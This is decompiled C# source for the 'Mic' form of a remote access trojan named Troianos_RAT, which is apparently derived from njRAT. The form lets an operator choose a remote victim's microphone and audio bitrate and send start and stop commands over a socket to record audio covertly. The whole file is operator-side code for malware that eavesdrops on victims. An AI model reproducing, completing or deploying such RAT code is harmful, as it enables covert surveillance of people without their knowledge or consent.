using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x02000016 RID: 22
	[DesignerGenerated]
	public partial class Mic : Form
	{
		// Token: 0x0600029C RID: 668 RVA: 0x001F14C8 File Offset: 0x001EF8C8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Mic.__ENCList;
			lock (_ENCList)
			{
				bool flag = Mic.__ENCList.Count == Mic.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Mic.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Mic.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Mic.__ENCList[num] = Mic.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Mic.__ENCList.RemoveRange(num, Mic.__ENCList.Count - num);
					Mic.__ENCList.Capacity = Mic.__ENCList.Count;
				}
				Mic.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x0600029F RID: 671 RVA: 0x001F1A54 File Offset: 0x001EFE54
		// (set) Token: 0x060002A0 RID: 672 RVA: 0x001F1A6C File Offset: 0x001EFE6C
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x060002A1 RID: 673 RVA: 0x001F1A78 File Offset: 0x001EFE78
		// (set) Token: 0x060002A2 RID: 674 RVA: 0x001F1A90 File Offset: 0x001EFE90
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x060002A3 RID: 675 RVA: 0x001F1AF0 File Offset: 0x001EFEF0
		// (set) Token: 0x060002A4 RID: 676 RVA: 0x001F1B08 File Offset: 0x001EFF08
		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= value2;
				}
				this._vmethod_4 = value;
				flag = (this._vmethod_4 != null);
				if (flag)
				{
					this._vmethod_4.Tick += value2;
				}
			}
		}

		// Token: 0x170000E6 RID: 230
		// (get) Token: 0x060002A5 RID: 677 RVA: 0x001F1B68 File Offset: 0x001EFF68
		// (set) Token: 0x060002A6 RID: 678 RVA: 0x001F1B80 File Offset: 0x001EFF80
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		// Token: 0x170000E7 RID: 231
		// (get) Token: 0x060002A7 RID: 679 RVA: 0x001F1B8C File Offset: 0x001EFF8C
		// (set) Token: 0x060002A8 RID: 680 RVA: 0x001F1BA4 File Offset: 0x001EFFA4
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x001F1BB0 File Offset: 0x001EFFB0
		public Mic()
		{
			base.Load += this.Mic_Load;
			base.FormClosing += this.Mic_FormClosing;
			Mic.__ENCAddToList(this);
			this.QQ = string.Empty;
			this.InitializeComponent();
		}

		// Token: 0x060002AA RID: 682 RVA: 0x001F1C08 File Offset: 0x001F0008
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Iniciar", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Para";
				this.Button1.Image = Resources.control_pause_blue;
				this.ComboBox1.Enabled = false;
				this.ComboBox2.Enabled = false;
				int value = 0;
				flag = this.ComboBox2.Text.Contains("16bit");
				if (flag)
				{
					value = 1;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"~",
					Class7.string_1,
					this.ComboBox1.SelectedIndex.ToString(),
					Class7.string_1,
					Conversions.ToString((int)Math.Round(Math.Round(Conversions.ToDouble(this.ComboBox2.Text.Split(new char[]
					{
						' '
					})[0]) * 1024.0))),
					Class7.string_1,
					Conversions.ToString(value)
				}));
			}
			else
			{
				this.sk.Send("~" + Class7.string_1 + "-1");
				this.Button1.Image = Resources.control_play_blue;
				this.Button1.Text = "Iniciar";
				this.ComboBox1.Enabled = true;
				this.ComboBox2.Enabled = true;
			}
		}

		// Token: 0x060002AB RID: 683 RVA: 0x001F1D98 File Offset: 0x001F0198
		private void Mic_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cn = this.sk.CN;
				if (cn)
				{
					this.sk.Send("~" + Class7.string_1 + "-1");
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
			this.Close();
		}

		// Token: 0x060002AC RID: 684 RVA: 0x001F1E1C File Offset: 0x001F021C
		private void Mic_Load(object sender, EventArgs e)
		{
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
				this.Text = Class6.smethod_17(0L) + " " + this.QQ;
			}
			catch (Exception ex)
			{
			}
			bool flag = this.ComboBox1.Items.Count == 0;
			if (flag)
			{
				this.Close();
			}
			else
			{
				this.Button1.ImageAlign = ContentAlignment.MiddleLeft;
				this.Button1.Image = Resources.control_play_blue;
				this.ComboBox1.SelectedIndex = 0;
				flag = (Class7.class8_0.int_1 > this.ComboBox2.Items.Count - 1);
				if (flag)
				{
					Class7.class8_0.int_1 = 0;
				}
				this.ComboBox2.SelectedIndex = Class7.class8_0.int_1;
				flag = Class7.class8_0.bool_8;
				if (flag)
				{
					this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
			}
		}

		// Token: 0x060002AD RID: 685 RVA: 0x001F1F58 File Offset: 0x001F0358
		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.osk == null | this.sk == null;
				if (flag)
				{
					this.Close();
					return;
				}
				flag = (!this.osk.CN | !this.sk.CN);
				if (flag)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.ProgressBar1.Value = this.sk.rp();
		}

		// Token: 0x04000142 RID: 322
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000144 RID: 324
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000145 RID: 325
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000146 RID: 326
		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		// Token: 0x04000147 RID: 327
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x04000148 RID: 328
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000149 RID: 329
		public Client osk;

		// Token: 0x0400014A RID: 330
		public string QQ;

		// Token: 0x0400014B RID: 331
		public Client sk;
	}
}
